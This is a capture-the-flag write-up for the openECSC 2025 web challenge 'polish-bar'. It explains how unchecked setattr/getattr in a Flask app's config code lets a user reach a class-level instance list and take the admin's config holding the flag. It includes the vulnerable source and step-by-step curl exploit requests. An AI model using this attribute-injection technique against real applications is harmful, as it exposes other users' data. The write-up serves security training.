# openECSC 2025

## Challenge: polish-bar

## Tags: web

## Difficulty: Medium

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Flag](#flag)

### Solution Overview

Polish Bar is a Flask web application with a configuration system vulnerable to prototype pollution. The app stores all user configurations in a class variable `_all_instances`, including the admin's config which contains the flag as `preferred_beverage`. Through a chain of vulnerabilities in the property management system, I can: (1) access the `_all_instances` list via the property getter, (2) replace my `alcohol_shelf` with the instances list, (3) exploit a bug in `empty_alcohol_shelf()` that lets me access the first element of any list assigned to `alcohol_shelf`, effectively giving me the admin's configuration object. The flag is then displayed directly in the template when accessing my profile. The exploit abuses Python's dynamic attribute setting combined with poor input validation in the configuration management logic.

### Tools Used

- **curl** - For HTTP requests and cookie handling
- **Web browser** - For initial reconnaissance and understanding the UI

### Solution

When I first opened Polish Bar, I saw a beverage-themed web app that lets users manage their "alcohol shelf" and set preferred beverages. The UI hinted at some kind of configuration system - users could update their preferred beverage and manage drinks on their shelf.

Looking at the source code, I immediately spotted the dangerous configuration system in `config.py`. The `update_property()` method caught my eye:

```python
def update_property(self, key: str, val: str):
    attr = self.get_property(val)  # Gets value from property name
    if attr:
        setattr(self, key, attr)   # Sets any attribute to any value!
        return
    return { 'error': 'property doesn\'t exist!' }
```

**First thought**: "Wait, this lets me set ANY attribute to ANY value returned by `get_property()`!"

The `get_property` method was equally concerning:

```python
def get_property(self, val):
    try:
        if hasattr(self.alcohol_shelf, val):
            return getattr(self.alcohol_shelf, val)
        return getattr(self, val)  # This can access class variables!
    except:
        return
```

This method first checks attributes on `self.alcohol_shelf`, then falls back to `self`. Since Python classes can have class variables accessible through instances, this might let me access sensitive class-level data.

#### Finding the Target

Looking at how the admin session is set up in `app.py`:

```python
def admin_session_setup():
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        'username': 'admin',
        'password': str(os.urandom(10).hex()),
        'config': BeverageConfig(os.getenv('FLAG', 'openECSC{TEST_FLAG}'))
    }
```

**Aha!** The flag is stored as the admin's `preferred_beverage` in their `BeverageConfig`. Now I just need to find a way to access the admin's configuration.

#### The Key Insight: _all_instances

Examining the class hierarchy, I noticed something interesting in `PreferenceConfig`:

```python
class PreferenceConfig(AlcoholShelf):
    _all_instances = []
    
    def __init__(self, preferred_beverage: str):
        # ...
        BeverageConfig._all_instances.append(self)  # ALL instances get added!
```

**Breakthrough moment**: Every `BeverageConfig` instance (including the admin's) gets added to this `_all_instances` class variable! If I can access this list through `get_property()`, I might be able to reach the admin's config.

#### The Exploit Chain

Here's how my thinking progressed:

1. **"Can I access `_all_instances`?"**  
   Since it's a class variable, `getattr(self, '_all_instances')` should work.

2. **"But how do I get from the list to individual instances?"**  
   Lists don't have useful attributes for accessing elements through `getattr()`. I need another approach.

3. **"Wait, what if I replace my `alcohol_shelf` with the instances list?"**  
   If `self.alcohol_shelf = _all_instances`, then my alcohol shelf becomes the list of all configs!

4. **"But I still can't index into lists with `getattr()`..."**  
   Then I remembered the `empty_alcohol_shelf()` method and its weird logic:

```python
def empty_alcohol_shelf(self):
    if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
        self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
    else:
        self.alcohol_shelf = self.alcohol_shelf[0]  # AHA!
```

**The final piece**: If my `alcohol_shelf` is a list (which doesn't have `_alcohol_shelf`), this method will execute `self.alcohol_shelf = self.alcohol_shelf[0]` - giving me the first element of the list!

#### Exploitation

First, I registered a user account to get a session:

```bash
curl -X POST "$TARGET/register" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=testuser&password=testpass" \
     -c cookies.txt
```

Then I tested my theory by trying to access `_all_instances`:

```bash
curl -X POST "$TARGET/config" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "config=preferred_beverage&value=_all_instances" \
     -b cookies.txt
```

**Success!** The response showed my preferred beverage was now a list of `BeverageConfig` objects. This confirmed that:

1. I can access class variables through `get_property()`
2. The `_all_instances` list contains multiple instances (including the admin's)

Next, I replaced my `alcohol_shelf` with the instances list:

```bash
curl -X POST "$TARGET/config" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "config=alcohol_shelf&value=_all_instances" \
     -b cookies.txt
```

The response showed my alcohol shelf now contained the `BeverageConfig` objects instead of drink names. Perfect!

Finally, I triggered the `empty_alcohol_shelf()` method to get the first instance:

```bash
curl -X POST "$TARGET/empty" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b cookies.txt
```

**BOOM!** The response showed my preferred beverage was now `openECSC{gggrrrrrrr_ppyytthhonnn_ca53fbaf19bd}` - the flag from the admin's configuration!

### Flag

`openECSC{gggrrrrrrr_ppyytthhonnn_ca53fbaf19bd}`
